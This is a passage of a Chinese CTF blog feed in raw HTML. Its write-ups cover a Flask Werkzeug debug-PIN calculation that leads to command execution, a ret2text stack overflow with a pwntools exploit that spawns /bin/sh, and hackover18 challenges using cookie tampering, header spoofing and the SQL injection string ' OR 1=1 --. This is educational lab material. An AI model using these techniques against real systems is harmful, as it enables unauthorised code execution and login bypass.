class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">注意这些`?&gt;`是为了闭合前面的语句，在重新添加一句ｐｈｐ的语句来执行命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 粗心的程序员呀(2018安恒8月赛)</span><br><span class="line"></span><br><span class="line">&gt;考点：Flask debug pin安全问题</span><br><span class="line">参考:https://xz.aliyun.com/t/2553</span><br><span class="line">http://skysec.top/2018/08/25/2018%E5%AE%89%E6%81%928%E6%9C%88%E8%B5%9BWriteup/#web</span><br><span class="line">https://www.smi1e.top/%e5%ae%89%e6%81%92%e6%9d%af%e6%9c%88%e8%b5%9bwrite-up/</span><br><span class="line">https://www.jianshu.com/p/e4cfa55a401a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">打开网站</span><br><span class="line"></span><br><span class="line">![](https://i.loli.net/2018/11/11/5be7b324372ec.png)</span><br><span class="line"></span><br><span class="line">点击注册</span><br><span class="line"></span><br><span class="line">![](https://i.loli.net/2018/11/11/5be7b3240ed12.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">写着什么图床系统，很奇怪,注册之后更奇怪</span><br><span class="line"></span><br><span class="line">![OperationalError database is locked Werkzeug Debugger.png](https://i.loli.net/2018/11/11/5be7b3243eefa.png)</span><br><span class="line"></span><br><span class="line">根据先知那位师傅的解释，主要就是利用Flask在debug模式下会生成一个Debugger PIN,我们就是要获取pin码，才可以进行任意的代码执行，来获取flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">参考飘零师傅的脚本</span><br><span class="line">```python</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &apos;ctf&apos;,# username</span><br><span class="line">    &apos;flask.app&apos;,# modname</span><br><span class="line">    &apos;Flask&apos;,# getattr(app, &apos;__name__&apos;, getattr(app.__class__, &apos;__name__&apos;))</span><br><span class="line">    &apos;/usr/local/lib/python2.7/dist-packages/flask/app.pyc&apos; # getattr(mod, &apos;__file__&apos;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    &apos;2485377892354&apos;# str(uuid.getnode()),  /sys/class/net/eth0/address</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&apos;utf-8&apos;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&apos;cookiesalt&apos;)</span><br><span class="line"></span><br><span class="line">cookie_name = &apos;__wzd&apos; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&apos;pinsalt&apos;)</span><br><span class="line">    num = (&apos;%09d&apos; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &apos;-&apos;.join(num[x:x + group_size].rjust(group_size, &apos;0&apos;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure></p><p>运行之后得到pin:<code>131-442-946</code></p><p>点击右边那个小终端</p><p><img src="https://i.loli.net/2018/11/11/5be7b679c3075.png" alt=""></p><p>输入刚才的pin</p><p><img src="https://i.loli.net/2018/11/11/5be7b679e9095.png" alt=""></p><p>然后就可以执行命令</p><p><img src="https://i.loli.net/2018/11/11/5be7b67a0b1ab.png" alt=""></p><p>输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[console ready]</span><br><span class="line">&gt;&gt;&gt; from subprocess import check_output</span><br><span class="line">&gt;&gt;&gt; check_output(<span class="string">'ls'</span>,shell=True)</span><br><span class="line"><span class="string">'app\nbin\nboot\ndev\netc\nfff111aaggggg___hhh\nhome\nlib\nlib64\nmedia\nmnt\nopt\n  </span></span><br><span class="line"><span class="string">&gt;&gt;&gt; os.popen('</span>cat fff111aaggggg___hhh<span class="string">').read()</span></span><br><span class="line"><span class="string">'</span>flag&#123;87052362d59339071c5ce607ad28b752&#125;\n<span class="string">'</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/11/11/5be7b76f5103f.png" alt=""></p><p>##　暴力可解</p><p>盲水印攻击首先爆破压缩包密码<code>23092019</code></p><p><code>python bwm.py decode 1.png 2.png flag.png</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;tjctf&quot;&gt;&lt;a href=&quot;#tjctf&quot; class=&quot;headerlink&quot; title=&quot;tjctf&quot;&gt;&lt;/a&gt;tjctf&lt;/h2&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;p
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>pwn之路_ret2text</title>
    <link href="https://threst.github.io/2018/11/11/pwn%E4%B9%8B%E8%B7%AF_ret2text/"/>
    <id>https://threst.github.io/2018/11/11/pwn之路_ret2text/</id>
    <published>2018-11-11T05:32:13.000Z</published>
    <updated>2018-11-11T10:16:43.797Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>题目地址:<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2text/bamboofox-ret2text" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2text/bamboofox-ret2text</a></p><p>源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">secure</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> secretcode, input;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    secretcode = rand();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;input);</span><br><span class="line">    <span class="keyword">if</span>(input == secretcode)</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"There is something amazing here, do you know anything?\n"</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Maybe I will tell you next time !"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>问题还是出现在gets函数上，可以无限读取用户的输入，只要我们输的足够长，就可以覆盖secure的返回地址，来执行系统操作了,流程理解，首先就是要知道输入多少才可以栈溢出</p><h5 id="寻找什么时候溢出"><a href="#寻找什么时候溢出" class="headerlink" title="寻找什么时候溢出"></a>寻找什么时候溢出</h5><p>我们使用cyclic命令来随机生成２００个’随机’的字符</p><blockquote><p>└──╼ $cyclic 200<br>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</p></blockquote><p>使用gdb来调试下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; run</span><br><span class="line">Starting program: /home/threst/ctf-challenges/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text </span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">Maybe I will tell you next time !</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x62616164 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────</span><br><span class="line"> EAX  0x0</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0x21</span><br><span class="line"> EDX  0xf7f9a890 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7f99000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c</span><br><span class="line"> EBP  0x62616163 (<span class="string">'caab'</span>)</span><br><span class="line"> ESP  0xffffd1a0 ◂— 0x62616165 (<span class="string">'eaab'</span>)</span><br><span class="line"> EIP  0x62616164 (<span class="string">'daab'</span>)</span><br><span class="line">────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────</span><br><span class="line">Invalid address 0x62616164</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; run</span><br><span class="line">Starting program: /home/threst/ctf-challenges/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text </span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">Maybe I will tell you next time !</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x62616164 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────</span><br><span class="line"> EAX  0x0</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0x21</span><br><span class="line"> EDX  0xf7f9a890 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7f99000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c</span><br><span class="line"> EBP  0x62616163 (<span class="string">'caab'</span>)</span><br><span class="line"> ESP  0xffffd1a0 ◂— 0x62616165 (<span class="string">'eaab'</span>)</span><br><span class="line"> EIP  0x62616164 (<span class="string">'daab'</span>)</span><br><span class="line">────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────</span><br><span class="line">Invalid address 0x62616164</span><br></pre></td></tr></table></figure></p><p>我们可以看见在<code>Invalid address 0x62616164</code>的位置上栈溢出了,然后在使用下面的命令</p><blockquote><p>└──╼ $cyclic -l 0x62616164<br>112</p></blockquote><p>可以看见在112的字符后面栈溢出了</p><h5 id="寻找要覆盖的地址"><a href="#寻找要覆盖的地址" class="headerlink" title="寻找要覆盖的地址"></a>寻找要覆盖的地址</h5><p>通过objdump发现system函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">└──╼ <span class="variable">$objdump</span> -R ret2text</span><br><span class="line"></span><br><span class="line">ret2text:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE </span><br><span class="line">08049ffc R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a040 R_386_COPY        stdin@@GLIBC_2.0</span><br><span class="line">0804a060 R_386_COPY        stdout@@GLIBC_2.0</span><br><span class="line">0804a00c R_386_JUMP_SLOT   <span class="built_in">printf</span>@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   gets@GLIBC_2.0</span><br><span class="line">0804a014 R_386_JUMP_SLOT   time@GLIBC_2.0</span><br><span class="line">0804a018 R_386_JUMP_SLOT   puts@GLIBC_2.0</span><br><span class="line">0804a01c R_386_JUMP_SLOT   system@GLIBC_2.0</span><br><span class="line">0804a020 R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a024 R_386_JUMP_SLOT   srand@GLIBC_2.0</span><br><span class="line">0804a028 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a02c R_386_JUMP_SLOT   setvbuf@GLIBC_2.0</span><br><span class="line">0804a030 R_386_JUMP_SLOT   rand@GLIBC_2.0</span><br><span class="line">0804a034 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure><p>ida中找返回地址</p><p><img src="https://i.loli.net/2018/11/11/5be7ed0590f70.png" alt=""></p><h5 id="写脚本"><a href="#写脚本" class="headerlink" title="写脚本"></a>写脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2text'</span>)</span><br><span class="line">target  = <span class="number">0x0804863A</span></span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'A'</span>*<span class="number">112</span>+p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="学习到的坑"><a href="#学习到的坑" class="headerlink" title="学习到的坑:"></a>学习到的坑:</h2><p>1.当输入的长度没有到栈溢出的位置的时候，程序直接可以正常退出，没有出现寄存器和栈图</p><p><img src="https://i.loli.net/2018/11/11/5be7ed205fd18.png" alt=""></p><p>栈溢出的结果</p><p><img src="https://i.loli.net/2018/11/11/5be7ed058bc05.png" alt=""></p><p>2.在ida中找返回地址</p><p><img src="https://i.loli.net/2018/11/11/5be7ed0590f70.png" alt=""></p><p>一定要找前缀为<code>.text</code>的位置</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ret2text&quot;&gt;&lt;a href=&quot;#ret2text&quot; class=&quot;headerlink&quot; title=&quot;ret2text&quot;&gt;&lt;/a&gt;ret2text&lt;/h2&gt;&lt;p&gt;题目地址:&lt;a href=&quot;https://github.com/ctf-wiki/ctf-
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://threst.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>hackover18</title>
    <link href="https://threst.github.io/2018/11/08/hackover18/"/>
    <id>https://threst.github.io/2018/11/08/hackover18/</id>
    <published>2018-11-08T05:32:13.000Z</published>
    <updated>2018-12-31T13:29:18.283Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/3169" target="_blank" rel="noopener">文章首发先知</a></p><h2 id="I-AM-MANY"><a href="#I-AM-MANY" class="headerlink" title="I AM MANY"></a>I AM MANY</h2><p>直接foremost分离即可</p><p><img src="https://i.loli.net/2018/10/13/5bc1ede5b2733.png" alt=""></p><p>flag:<code>hackover18{different_Fl4g_for_3arly_ch33tahz}</code></p><h2 id="ez-web"><a href="#ez-web" class="headerlink" title="ez web"></a>ez web</h2><blockquote><p>Easy web challenge in the slimmest possible design…. namely none.<br><a href="http://ez-web.ctf.hackover.de:8080" target="_blank" rel="noopener">http://ez-web.ctf.hackover.de:8080</a></p></blockquote><p>发现有<code>robots.txt</code>文件，提示<code>/flag/</code>,进入文件夹,有个<code>falg.txt</code>,点击提示</p><blockquote><p>You do not have permission to enter this Area. A mail has been sent to our Admins.<br>You shall be arrested shortly.</p></blockquote><p>抓包修改<code>Cookie: isAllowed=true</code></p><p>flag:<code>hackover18{W3llD0n3,K1d.Th4tSh0tw4s1InAM1ll10n}</code></p><h2 id="i-love-heddha"><a href="#i-love-heddha" class="headerlink" title="i-love-heddha"></a>i-love-heddha</h2><blockquote><p>A continuation of the Ez-Web challenge. enjoy<br>207.154.226.40:8080</p></blockquote><p>是刚才那个的升级版,一样的找到<code>/flag/flag.txt</code>,设置<code>isAllowed</code>，</p><p>可是然后提示<code>ou are using the wrong browser, &#39;Builder browser 1.0.1&#39; is required</code></p><p><code>You are refered from the wrong location hackover.18 would be the correct place to come fro</code></p><p>修改UA,referer,得到flag:<code>hackover18{4ngryW3bS3rv3rS4ysN0}</code></p><p><img src="https://i.loli.net/2018/10/13/5bc1e7f86e780.png" alt=""></p><h2 id="who-knows-john-dows"><a href="#who-knows-john-dows" class="headerlink" title="who knows john dows?"></a>who knows john dows?</h2><blockquote><p>Howdy mate! Just login and hand out the flag, aye! You can find on h18johndoe has all you need!</p></blockquote><p>打开网站直接是要你输入用户名或邮箱</p><p><img src="https://i.loli.net/2018/10/13/5bc1e74a031c9.png" alt=""></p><p>随便输一个，发现不对,根据提示<code>h18johndoe</code>,去github上面试试，果然搜到一个用户</p><p>github:<a href="https://github.com/h18johndoe" target="_blank" rel="noopener">https://github.com/h18johndoe</a></p><p>把这个仓库下下来<code>git clone https://github.com/h18johndoe/user_repository.git</code></p><p><img src="https://i.loli.net/2018/10/13/5bc1e892d9ac4.png" alt=""></p><p>发现很多邮箱，一个一个去试试,尝试之后只有<a href="mailto:`john_doe@notes.h18" target="_blank" rel="noopener">`john_doe@notes.h18</a>`可以登录</p><p><img src="https://i.loli.net/2018/10/13/5bc1e8f4dcda5.png" alt=""></p><p>登录之后提示输入密码，尝试万能密码<code>&#39; OR 1=1 --:</code>,成功！！</p><p>flag:<code>hackover18{I_KN0W_H4W_70_STALK_2018}</code></p><h2 id="secure-hash"><a href="#secure-hash" class="headerlink" title="secure-hash"></a>secure-hash</h2><blockquote><p>We advise you to replace uses of unordered_hash with our new SecureHashtable class, since we added advanced crypto to make it 14.3 times more secure.<br>Update: the binary was compiled with g++ and libstdc++, 64bit<br>We’re running a demo version, try it now:<br>nc secure-hash.ctf.hackover.de 1337</p></blockquote><p>源代码如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/evp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">// TODO - Make an #ifdef to detect openssl/libressl.</span></span><br><span class="line"><span class="comment">//#define EVP_CREATE_FN() EVP_MD_CTX_new()</span></span><br><span class="line"><span class="comment">//#define EVP_DESTROY_FN(x) EVP_MD_CTX_free(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EVP_CREATE_FN() EVP_MD_CTX_create()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EVP_DESTROY_FN(x) EVP_MD_CTX_cleanup(x)</span></span><br><span class="line"><span class="keyword">enum</span> auth_result &#123;</span><br><span class="line">    AUTH_FAILURE,</span><br><span class="line">    AUTH_SUCCESS,</span><br><span class="line">    AUTH_TIMEOUT,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecureHashtable</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> MAX_SIZE = <span class="number">15000</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unordered_set</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; values;</span><br><span class="line">    <span class="built_in">std</span>::<span class="function"><span class="built_in">string</span> <span class="title">sha512sum</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; name, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; password)</span> </span>&#123;</span><br><span class="line">        EVP_MD_CTX *mdctx;</span><br><span class="line">        <span class="keyword">const</span> EVP_MD *md;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> md_value[EVP_MAX_MD_SIZE];</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> md_len;</span><br><span class="line">        mdctx = EVP_CREATE_FN();</span><br><span class="line">        md = EVP_get_digestbyname(<span class="string">"sha512"</span>);</span><br><span class="line">        EVP_MD_CTX_init(mdctx);</span><br><span class="line">        EVP_DigestInit_ex(mdctx, md, <span class="literal">NULL</span>);</span><br><span class="line">        EVP_DigestUpdate(mdctx, name.c_str(), name.size());</span><br><span class="line">        EVP_DigestUpdate(mdctx, password.c_str(), password.size());</span><br><span class="line">        EVP_DigestFinal_ex(mdctx, md_value, &amp;md_len);</span><br><span class="line">        EVP_DESTROY_FN(mdctx);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">std</span>::<span class="built_in">string</span>(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(md_value), md_len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    SecureHashtable() &#123;</span><br><span class="line">        values.reserve(MAX_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">insert_keyvalue</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; name, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (values.size() &gt;= MAX_SIZE)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// Size limit exceeded.</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> digest = sha512sum(name, password);</span><br><span class="line">        values.insert(digest);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">auth_result <span class="title">lookup_keyvalue</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; name, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; password)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> digest = sha512sum(name, password);</span><br><span class="line">        <span class="keyword">size_t</span> bucket = values.bucket(digest);</span><br><span class="line">        <span class="keyword">auto</span> it = values.begin(bucket), end = values.end(bucket);</span><br><span class="line">        <span class="keyword">size_t</span> iterations = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">size_t</span> MAX_ITERATIONS = <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">while</span> (it != end) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*it++ == digest)</span><br><span class="line">                <span class="keyword">return</span> AUTH_SUCCESS;</span><br><span class="line">            <span class="comment">// Avoid DoS attacks by fixing upper time limit.</span></span><br><span class="line">            <span class="keyword">if</span> (iterations++ &gt;= MAX_ITERATIONS)</span><br><span class="line">                <span class="keyword">return</span> AUTH_TIMEOUT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> AUTH_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    OpenSSL_add_all_digests();</span><br><span class="line">  